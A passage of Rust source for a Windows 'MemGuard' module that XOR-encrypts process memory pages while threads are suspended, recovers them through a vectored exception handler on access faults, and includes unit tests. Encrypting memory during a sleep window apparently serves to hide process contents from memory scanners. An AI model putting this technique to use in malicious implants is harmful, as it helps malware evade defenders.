        for j in 0..n {
            let e = entries.add(j);
            match (*e).state.load(Ordering::Acquire) {
                PG_PLAINTEXT => {}
                PG_BUSY => busy = true,
                PG_ENCRYPTED => {
                    // Recover the orphaned / late page.
                    if !decrypt_one_owned(e) {
                        if (*e).state.load(Ordering::Acquire) == PG_ENCRYPTED {
                            return false; // unwritable -> fail-closed
                        }
                        busy = true; // became PG_BUSY under us -> wait
                    }
                }
                // Any other (unexpected) value: wait defensively.
                _ => busy = true,
            }
        }
        if !busy {
            break; // all entries PG_PLAINTEXT (any PG_ENCRYPTED were processed)
        }
        if waited_ms >= MAX_BUSY_WAIT_MS {
            return false; // stuck VEH owner -> never certify (fail-closed)
        }
        let backoff = BUSY_BACKOFF_MS.min(MAX_BUSY_WAIT_MS - waited_ms);
        Sleep(backoff as u32);
        waited_ms += backoff;
    }

    (*state).decrypt_cursor.store(0, Ordering::Release);
    (*state).count.store(0, Ordering::Release);
    true
}

// ---------------------------------------------------------------------------
// VEH decrypt-on-fault safety net.
//
// Registered once per process via AddVectoredExceptionHandler(1, handler) at the
// first successful MemGuard::new(). It is the tail-risk recovery path: if the
// watchdog dies mid-encrypt/decrypt (or foreign/injected code touches an
// encrypted page during the sleep window), the next fault on an encrypted page
// is lazily decrypted here so the process survives instead of tripping the
// unhandled-exception filter.
//
// HARD handler constraints (no allocation, no locks, no TLS, no panics,
// no loader/format/log): the handler works only over the unencrypted state
// region reached through the module-level `STATE` atomic pointer.
// ---------------------------------------------------------------------------

// Cheap, allocation-free current-thread key for the recursion guard. On x64 the
// TEB pointer is read straight out of the `gs` segment (user-mode TEB base) via
// a single `mov`; this is a plain memory read that does not touch TLS/heap. On
// other architectures we fall back to GetCurrentThreadId (also TLS-free).
#[cfg(target_arch = "x86_64")]
#[inline(always)]
unsafe fn current_thread_key() -> usize {
    let teb: usize;
    core::arch::asm!("mov {0}, gs:[0x30]", out(reg) teb, options(nostack));
    teb
}

#[cfg(not(target_arch = "x86_64"))]
#[inline(always)]
unsafe fn current_thread_key() -> usize {
    GetCurrentThreadId() as usize
}

const RECURSION_NESTED: i32 = -1;
const RECURSION_UNTRACKED: i32 = -2;

// Tid-keyed recursion guard. Detects SAME-thread nested re-entry into the VEH
// (returns RECURSION_NESTED so the handler returns CONTINUE_SEARCH) while
// admitting concurrent faults on DIFFERENT threads (each gets its own slot, so
// two threads faulting on two different encrypted pages both recover). The thread
// key is the faulting thread's TEB pointer, which is unique per live thread.
//
// UNSAFE INVARIANT - single array (0 = free, non-zero TEB-key = active): the old
// design held a (tid, active) pair and CAS'd tid then stored active in two steps,
// leaving a window where a nested fault on the same thread between the tid-CAS and
// the active-store could miss the guard. Collapsing to one atomic slot removes
// that split-state race. slot-exhaustion (proceed-untracked) is still safe: a
// nested re-entry on the SAME page self-protects via the per-page CAS, and a
// nested fault on a DIFFERENT page is recovered normally. Recursion is bounded by
// the number of distinct encrypted pages, so it cannot spin unboundedly.
unsafe fn recursion_admit(state: *mut State, key: usize) -> i32 {
    for i in 0..RECURSION_SLOTS {
        let slot =
            AtomicUsize::from_ptr(core::ptr::addr_of_mut!((*state).recursion[i]) as *mut usize);
        if slot.load(Ordering::Acquire) == key {
            return RECURSION_NESTED;
        }
    }
    for i in 0..RECURSION_SLOTS {
        let slot =
            AtomicUsize::from_ptr(core::ptr::addr_of_mut!((*state).recursion[i]) as *mut usize);
        if slot
            .compare_exchange(0, key, Ordering::AcqRel, Ordering::Acquire)
            .is_ok()
        {
            return i as i32;
        }
    }
    RECURSION_UNTRACKED // all slots full: admit untracked (see UNSAFE INVARIANT above)
}

unsafe fn recursion_release(state: *mut State, slot: i32) {
    if slot >= 0 {
        let i = slot as usize;
        let slot_atomic =
            AtomicUsize::from_ptr(core::ptr::addr_of_mut!((*state).recursion[i]) as *mut usize);
        slot_atomic.store(0, Ordering::Release);
    }
}

unsafe extern "system" fn veh_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    // Everything below is raw pointer work over the unencrypted state region;
    // no std/heap/TLS/locking is touched.
    if exception_info.is_null() {
        return VEH_CONTINUE_SEARCH;
    }
    let record = (*exception_info).ExceptionRecord;
    if record.is_null() {
        return VEH_CONTINUE_SEARCH;
    }
    // Only access violations are ours to consider. Anything else (breakpoint,
    // integer divide, guard-page, etc.) is a fault the VEH cannot recover and
    // must be surfaced so the diagnosis trace can catch faults whose context
    // prevents the handler from running at all.
    if (*record).ExceptionCode != VEH_ACCESS_VIOLATION {
        #[cfg(feature = "print_debug")]
        {
            let addr = if (*record).NumberParameters >= 2 {
                *(*record).ExceptionInformation.as_ptr().add(1)
            } else {
                0
            };
            crate::memguard::watchdog::trace_veh_miss(
                addr as usize,
                (*record).ExceptionCode as usize,
            );
        }
        return VEH_CONTINUE_SEARCH;
    }
    // ExceptionInformation[1] is the faulting virtual address for an AV, but some
    // records carry fewer than 2 parameters; guard the read before relying on it.
    if (*record).NumberParameters < 2 {
        return VEH_CONTINUE_SEARCH;
    }
    let info = (*record).ExceptionInformation.as_ptr();
    let addr = *info.add(1);
    let state = STATE.load(Ordering::Acquire);
    if state.is_null() {
        #[cfg(feature = "print_debug")]
        crate::memguard::watchdog::trace_veh_miss(addr as usize, VEH_ACCESS_VIOLATION as usize);
        return VEH_CONTINUE_SEARCH;
    }
    // Per-thread recursion guard: nested re-entry on the same thread returns
    // CONTINUE_SEARCH; concurrent faults on distinct threads each recover.
    let key = current_thread_key();
    let slot = recursion_admit(state, key);
    if slot == RECURSION_NESTED {
        #[cfg(feature = "print_debug")]
        crate::memguard::watchdog::trace_veh_miss(addr as usize, VEH_ACCESS_VIOLATION as usize);
        return VEH_CONTINUE_SEARCH;
    }
    let ok = decrypt_page_for_fault(state, addr as *const u8);
    recursion_release(state, slot);
    if ok {
        // Successful lazy decrypt: log a compact `veh-recover` line with the
        // running counter held in the unencrypted State region. Bounded by page
        // count. The trace write itself is non-allocating (StackBuf on the
        // faulting thread's stack + unencrypted trace handle).
        #[cfg(feature = "print_debug")]
        {
            let n = (*state).veh_recover_count.fetch_add(1, Ordering::AcqRel) + 1;
            crate::memguard::watchdog::trace_veh_recover(addr as usize, n);
        }
        VEH_CONTINUE_EXECUTION
    } else {
        // Miss: fault not on one of our pages (or page busy/already-plain) ->
        // CONTINUE_SEARCH. Log it so the diagnosis trace can reveal faults the
        // VEH cannot recover (non-entry pages, guard pages, or fault contexts
        // where the handler itself cannot run).
        #[cfg(feature = "print_debug")]
        crate::memguard::watchdog::trace_veh_miss(addr as usize, VEH_ACCESS_VIOLATION as usize);
        VEH_CONTINUE_SEARCH
    }
}

// Decrypt a single faulting page. Returns true iff the page was ours and is now
// decrypted (caller should CONTINUE_EXECUTION).
unsafe fn decrypt_page_for_fault(state: *mut State, addr: *const u8) -> bool {
    // UNSAFE INVARIANT — VEH/engine concurrency:
    // The watchdog suspends all other threads during its bulk encrypt/decrypt
    // pass, so the only time a faulting (i.e. *running*) thread can invoke this
    // handler is when the watchdog is *not* mid-pass on that thread's pages —
    // either the watchdog is asleep (between cycles), or it has crashed. The
    // watchdog is therefore never a concurrent writer of `count`,
    // `decrypt_cursor`, or `entries` while a faulting thread reads them, AND the
    // per-entry CAS below makes the claim itself lock-free: both the VEH and the
    // watchdog CAS PG_ENCRYPTED->PG_BUSY before touching a page, so a page is
    // decrypted by exactly one actor. Plain atomic loads of `count`/
    // `decrypt_cursor` are hence safe without locks. The tid-keyed recursion
    // guard (in the handler) additionally lets concurrent faults on different
    // threads each proceed instead of serializing on a global flag.
    let cursor = (*state).decrypt_cursor.load(Ordering::Acquire);
    let count = (*state).count.load(Ordering::Acquire);
    if cursor >= count {
        return false;
    }
    let page = (addr as usize & !(PAGE_SIZE - 1)) as *mut u8;
    let entries = (*state).entries;
    // Binary search the sorted-by-base encrypted tail [cursor..count). The base
    // is never nulled (kept sorted) so the search stays correct; the page state
    // is tracked separately via the atomic `state` field.
    let mut lo = cursor;
    let mut hi = count;
    let mut found = usize::MAX;
    while lo < hi {
        let mid = lo + (hi - lo) / 2;
        let e = entries.add(mid);
        let b = (*e).base;
        if b < page {
            lo = mid + 1;
        } else if b > page {
            hi = mid;
        } else {
            found = mid;
            break;
        }
    }
    if found == usize::MAX {
        return false; // not one of our encrypted pages
    }
    let e = entries.add(found);
    // Single retry loop sharing one bounded spin budget: a CAS loser re-enters
    // here instead of dying, so two threads racing the same PG_ENCRYPTED page both
    // recover. PG_PLAINTEXT => success; PG_BUSY => bounded spin; PG_ENCRYPTED =>
    // try the lock-free claim; Err(actual) => cur = actual and loop again.
    let mut cur = (*e).state.load(Ordering::Acquire);
    let mut spins = 0usize;
    const PG_BUSY_SPIN_LIMIT: usize = 10_000_000;
    loop {
        if cur == PG_PLAINTEXT {
            return true;
        }
        if cur == PG_BUSY {
            // UNSAFE INVARIANT (bounded PG_BUSY spin): the cap (~10M spins ≈ tens
            // of ms) is far longer than any legitimate decrypt, so reaching it means
            // the claimant aborted mid-CAS and will never transition; we then treat
            // the page as still-claimed and CONTINUE_SEARCH rather than spin forever.
            if spins >= PG_BUSY_SPIN_LIMIT {
                return false;
            }
            core::hint::spin_loop();
            cur = (*e).state.load(Ordering::Acquire);
            spins += 1;
            continue;
        }
        match (*e).state.compare_exchange(
            PG_ENCRYPTED,
            PG_BUSY,
            Ordering::AcqRel,
            Ordering::Acquire,
        ) {
            Ok(_) => break,
            Err(actual) => {
                cur = actual;
                continue;
            }
        }
    }
    let orig_protect = (*e).orig_protect;
    let mut old = 0u32;
    if VirtualProtect(page as *const c_void, PAGE_SIZE, PAGE_READWRITE, &mut old) == 0 {
        // Could not make the page writable: un-claim (back to encrypted) and
        // miss so the caller returns CONTINUE_SEARCH.
        (*e).state.store(PG_ENCRYPTED, Ordering::Release);
        return false;
    }
    // XOR back to plaintext (the key is its own inverse).
    let slice = core::slice::from_raw_parts_mut(page, PAGE_SIZE);
    for b in slice.iter_mut() {
        *b ^= XOR_KEY;
    }
    // Restore the recorded original protection. In every real case orig_protect
    // is PAGE_READWRITE, so this is a no-op; even if an exotic restore failed
    // the page is usable plaintext, so we still report success (CONTINUE_
    // EXECUTION) — the faulting instruction re-executes on plaintext.
    if orig_protect != PAGE_READWRITE {
        let mut old = 0u32;
        VirtualProtect(page as *const c_void, PAGE_SIZE, orig_protect, &mut old);
    }
    (*e).state.store(PG_PLAINTEXT, Ordering::Release);
    true
}

unsafe fn register_veh() -> bool {
    // Idempotent: only the first caller actually registers (VEH_REGISTERED is
    // set once and never cleared — registration is process-lifetime).
    if VEH_REGISTERED.swap(true, Ordering::AcqRel) {
        return true;
    }
    let handle = AddVectoredExceptionHandler(1, Some(veh_handler));
    if handle.is_null() {
        VEH_REGISTERED.store(false, Ordering::Release);
        return false;
    }
    VEH_HANDLE.store(handle, Ordering::Release);
    true
}

// ---------------------------------------------------------------------------
// QA / Phase-4 test hook.
//
// `debug_simulate_crash_partial_decrypt(keep)` simulates a watchdog death in the
// middle of the bulk decrypt: it decrypts only the first `keep` encrypted pages
// (advancing `decrypt_cursor`) and deliberately leaves the remainder
// NOACCESS+encrypted, exactly as a mid-decrypt watchdog crash would. Phase-4 QA
// triggers this, then touches a still-encrypted page from a thread and asserts
// the VEH lazily decrypts it and execution continues.
// ---------------------------------------------------------------------------
#[cfg(any(test, feature = "print_debug"))]
#[allow(dead_code)]
pub fn debug_simulate_crash_partial_decrypt(keep: usize) {
    unsafe {
        let state = STATE.load(Ordering::Acquire);
        if state.is_null() {
            return;
        }
        partial_decrypt_cursor(state, keep);
    }
}

#[cfg(any(test, feature = "print_debug"))]
#[allow(dead_code)]
unsafe fn partial_decrypt_cursor(state: *mut State, keep: usize) {
    let n = (*state).count.load(Ordering::Acquire);
    let start = (*state).decrypt_cursor.load(Ordering::Acquire);
    if start >= n {
        return;
    }
    let limit = start + keep.min(n - start);
    let entries = (*state).entries;
    let mut i = start;
    while i < limit {
        let e = entries.add(i);
        // Skip pages not in the encrypted state (already decrypted by the VEH or
        // in flight); advancing the cursor past them keeps bulk-decrypt correct.
        let cur = (*e).state.load(Ordering::Acquire);
        if cur != PG_ENCRYPTED {
            (*state).decrypt_cursor.store(i + 1, Ordering::Release);
            i += 1;
            continue;
        }
        if (*e)
            .state
            .compare_exchange(PG_ENCRYPTED, PG_BUSY, Ordering::AcqRel, Ordering::Acquire)
            .is_err()
        {
            (*state).decrypt_cursor.store(i + 1, Ordering::Release);
            i += 1;
            continue;
        }
        let page = (*e).base;
        let orig = (*e).orig_protect;
        let mut old = 0u32;
        if VirtualProtect(page as *const c_void, PAGE_SIZE, PAGE_READWRITE, &mut old) == 0 {
            // Cannot make writable: leave encrypted and stop (simulated crash).
            (*e).state.store(PG_ENCRYPTED, Ordering::Release);
            (*state).decrypt_cursor.store(i, Ordering::Release);
            return;
        }
        // XOR to plaintext. Once XOR succeeds the page is plaintext regardless
        // of the (best-effort) orig restore, so record PG_PLAINTEXT immediately
        // to guarantee the later bulk-decrypt can never re-XOR it (#7).
        let slice = core::slice::from_raw_parts_mut(page, PAGE_SIZE);
        for b in slice.iter_mut() {
            *b ^= XOR_KEY;
        }
        (*e).state.store(PG_PLAINTEXT, Ordering::Release);
        if orig != PAGE_READWRITE {
            let mut old = 0u32;
            VirtualProtect(page as *const c_void, PAGE_SIZE, orig, &mut old);
        }
        (*state).decrypt_cursor.store(i + 1, Ordering::Release);
        i += 1;
    }
    // Leave [i..n) encrypted + NOACCESS, simulating the crash mid-pass.
    (*state).decrypt_cursor.store(i, Ordering::Release);
}

/// Exclude a thread's TEB/PEB/TLS block and its *entire* stack from
/// encryption, given the thread's TEB pointer and captured stack bounds
/// (StackBase at TEB+0x08, StackLimit at TEB+0x10). This is the shared body for
/// `exclude_current_thread` and for integration tests that need to exclude a
/// *spawned* touching thread: the spawned thread reads its own TEB (gs:[0x30])
/// and stack bounds and reports them to the test thread, which excludes them
/// before `encrypt()`. The spawned thread's TEB/stack MUST stay unencrypted or
/// `KiUserExceptionDispatcher` faults building its frame on the encrypted stack
/// / reading the encrypted TEB -> APPCRASH (DEFECT 1).
#[cfg(all(windows, feature = "mem-obfuscation"))]
pub(crate) fn exclude_thread_state_and_stack(
    guard: &mut MemGuard,
    teb: *const u8,
    stack_base: *const u8,
    stack_limit: *const u8,
) -> bool {
    if teb.is_null() {
        return false;
    }
    unsafe {
        let teb_size = region_size_of(teb as *mut c_void);
        if teb_size > 0 && !guard.add_exclusion(teb, teb_size) {
            return false;
        }
        // PEB (TEB+0x60), then the narrow ProcessParameters struct (PEB+0x20).
        let peb = *(teb.add(0x60) as *const *mut c_void);
        if !peb.is_null() {
            let peb_size = region_size_of(peb);
            if peb_size > 0 && !guard.add_exclusion(peb as *const u8, peb_size) {
                return false;
            }
            let pp = *(peb.add(0x20) as *const *mut c_void);
            if !pp.is_null() {
                let pp_base = (pp as usize) & !(PAGE_SIZE - 1);
                let pp_end = (pp as usize) + 0x490;
                let pp_pages_end = (pp_end + PAGE_SIZE - 1) & !(PAGE_SIZE - 1);
                let pp_len = pp_pages_end - pp_base;
                if pp_len > 0 && !guard.add_exclusion(pp_base as *const u8, pp_len) {
                    return false;
                }
            }
        }
        // TLS + TLS expansion.
        let tls = *(teb.add(0x58) as *const *mut c_void);
        if !tls.is_null() {
            let page = (tls as usize & !(PAGE_SIZE - 1)) as *const u8;
            if !guard.add_exclusion(page, PAGE_SIZE) {
                return false;
            }
            // Walk the per-module TLS block pointer array (bounded) and exclude each
            // pointed-to block's page.
            for i in 0..TLS_BLOCK_PTRS {
                let slot = (tls as *const *mut c_void).add(i);
                let block = *slot;
                if !block.is_null() {
                    let bpage = (block as usize & !(PAGE_SIZE - 1)) as *const u8;
                    if !guard.add_exclusion(bpage, PAGE_SIZE) {
                        return false;
                    }
                }
            }
        }
        let tls_exp = *(teb.add(TLS_EXPANSION_SLOTS_OFFSET) as *const *mut c_void);
        if !tls_exp.is_null() {
            let base = (tls_exp as usize & !(PAGE_SIZE - 1)) as *const u8;
            if !guard.add_exclusion(base, TLS_EXP_SPAN) {
                return false;
            }
        }
        // Whole stack (StackBase/StackLimit at TEB+0x08/0x10).
        if !stack_base.is_null()
            && !stack_limit.is_null()
            && stack_base as usize > stack_limit as usize
        {
            if !guard.add_exclusion(stack_limit, stack_base as usize - stack_limit as usize) {
                return false;
            }
        }
        true
    }
}

/// Test/QA helper: exclude the *current* thread's own live state (TEB/PEB/TLS and
/// whole stack) from encryption, exactly as `add_watchdog_exclusions` does for the
/// watchdog thread. Standalone integration tests call `MemGuard::encrypt()` from
/// the test thread itself, so without this the test thread's own stack would be
/// encrypted + NOACCESS and the next stack touch (including VEH dispatch, which
/// builds its frame below RSP) would fault -> APPCRASH. Gated to the same cfg as
/// the rest of the engine.
#[cfg(all(windows, feature = "mem-obfuscation"))]
pub(crate) fn exclude_current_thread(guard: &mut MemGuard) -> bool {
    let cur = unsafe { GetCurrentThread() };
    let ntqit = unsafe { (*guard.state).nt_query_information_thread };
    let mut tbi = core::mem::MaybeUninit::<ThreadBasicInformation>::uninit();
    let status = unsafe {
        ntqit(
            cur,
            THREAD_BASIC_INFORMATION_CLASS,
            tbi.as_mut_ptr() as *mut c_void,
            core::mem::size_of::<ThreadBasicInformation>() as u32,
            core::ptr::null_mut(),
        )
    };
    if status < 0 {
        return false;
    }
    let teb = unsafe { tbi.assume_init().teb_base } as *const u8;
    if teb.is_null() {
        return false;
    }
    // Whole stack (StackBase/StackLimit at TEB+0x08/0x10).
    let stack_base = unsafe { *(teb.add(0x08) as *const *mut c_void) } as *const u8;
    let stack_limit = unsafe { *(teb.add(0x10) as *const *mut c_void) } as *const u8;
    exclude_thread_state_and_stack(guard, teb, stack_base, stack_limit)
}

#[cfg(all(windows, feature = "mem-obfuscation", test))]
mod tests {
    use super::*;
    use windows_sys::Win32::System::Memory::{
        MEM_COMMIT, MEM_RESERVE, MEMORY_BASIC_INFORMATION, PAGE_NOACCESS, PAGE_READONLY,
        PAGE_READWRITE,
    };

    #[test]
    fn encrypt_decrypt_roundtrip() {
        // Serialize with the watchdog integration test which also creates the
        // process-wide MemGuard singleton.
        let _g = crate::memguard::TEST_LOCK.lock().unwrap();
        unsafe {
            let buf = VirtualAlloc(
                core::ptr::null(),
                PAGE_SIZE,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            ) as *mut u8;
            assert!(!buf.is_null(), "VirtualAlloc failed");

            let mut pattern = [0u8; PAGE_SIZE];
            for (i, b) in pattern.iter_mut().enumerate() {
                *b = (i as u8).wrapping_add(1);
            }
            core::ptr::copy_nonoverlapping(pattern.as_ptr(), buf, PAGE_SIZE);

            let mut guard = MemGuard::new().expect("memguard init");

            // Singleton guard: a second concurrent instance must be refused
            // while one is already alive.
            assert!(
                MemGuard::new().is_none(),
                "second MemGuard::new() must return None while one is alive"
            );

            // Exclude the test thread's own stack/TEB/PEB/TLS before encrypting,
            // or the test thread's live stack would be encrypted + NOACCESS and the
            // next stack touch (incl. VEH dispatch) would fault -> APPCRASH.
            assert!(
                exclude_current_thread(&mut guard),
                "exclude_current_thread failed"
            );
            for cycle in 0..2 {
                assert!(guard.encrypt(), "encrypt failed (cycle {cycle})");

                let mut mbi = core::mem::MaybeUninit::<MEMORY_BASIC_INFORMATION>::uninit();
                let r = VirtualQuery(
                    buf as *const c_void,
                    mbi.as_mut_ptr(),
                    core::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
                );
                assert!(r != 0, "VirtualQuery failed (cycle {cycle})");
                assert_eq!(
                    mbi.assume_init().Protect,
                    PAGE_NOACCESS,
                    "buffer should be NOACCESS after encrypt (cycle {cycle})"
                );

                let mut old = 0u32;
                assert!(
                    VirtualProtect(buf as *const c_void, PAGE_SIZE, PAGE_READONLY, &mut old) != 0,
                    "VirtualProtect RO failed (cycle {cycle})"
                );
                let mut enc = [0u8; PAGE_SIZE];
                core::ptr::copy_nonoverlapping(buf, enc.as_mut_ptr(), PAGE_SIZE);
                assert!(
                    VirtualProtect(buf as *const c_void, PAGE_SIZE, PAGE_NOACCESS, &mut old) != 0,
                    "VirtualProtect NA failed (cycle {cycle})"
                );

                for i in 0..PAGE_SIZE {
                    assert_eq!(
                        enc[i],
                        pattern[i] ^ XOR_KEY,
                        "byte {i} not XOR'd (cycle {cycle})"
                    );
                }

                assert!(guard.decrypt(), "decrypt failed (cycle {cycle})");

                let mut mbi = core::mem::MaybeUninit::<MEMORY_BASIC_INFORMATION>::uninit();
                let r = VirtualQuery(
                    buf as *const c_void,
                    mbi.as_mut_ptr(),
                    core::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
                );
                assert!(r != 0, "VirtualQuery failed (cycle {cycle})");
                assert_eq!(
                    mbi.assume_init().Protect,
                    PAGE_READWRITE,
                    "buffer should be READWRITE after decrypt (cycle {cycle})"
                );

                let mut dec = [0u8; PAGE_SIZE];
                core::ptr::copy_nonoverlapping(buf, dec.as_mut_ptr(), PAGE_SIZE);
                for i in 0..PAGE_SIZE {
                    assert_eq!(dec[i], pattern[i], "byte {i} not restored (cycle {cycle})");
                }
            }

            VirtualFree(buf as *mut c_void, 0, MEM_RELEASE);
        }
    }

    #[test]
    fn commit_entries_byte_math() {
        // Serialize with the other memguard tests (process-wide singleton).
        let _g = crate::memguard::TEST_LOCK.lock().unwrap();
        unsafe {
            let mut guard = MemGuard::new().expect("memguard init");
            // After new(), capacity == 0 and count == 0. Commit a single entry: this
            // must commit exactly one page at the page-aligned entries base and grow
            // capacity by ENTRIES_PER_PAGE. (This would have caught the 16x-off
            // regression where the second growth committed at the wrong offset.)
            assert!(
                commit_entries(guard.state, 1),
                "commit_entries(1) must succeed"
            );
            assert_eq!(
                (*guard.state).capacity,
                ENTRIES_PER_PAGE,
                "capacity must grow by one page"
            );
            let entries = (*guard.state).entries as *mut u8;
            let end = entries.add(PAGE_SIZE - 1);
            *end = 0xAB;
            assert_eq!(*end, 0xAB, "first committed page must be writable");
            assert!(
                commit_entries(guard.state, ENTRIES_PER_PAGE + 1),
                "commit_entries(page+1) must succeed"
            );
            assert_eq!(
                (*guard.state).capacity,
                2 * ENTRIES_PER_PAGE,
                "capacity must grow by another page"
            );
            let end2 = (entries as *mut u8).add(2 * PAGE_SIZE - 1);
            *end2 = 0xCD;
            assert_eq!(*end2, 0xCD, "second committed page must be writable");
        }
    }
}
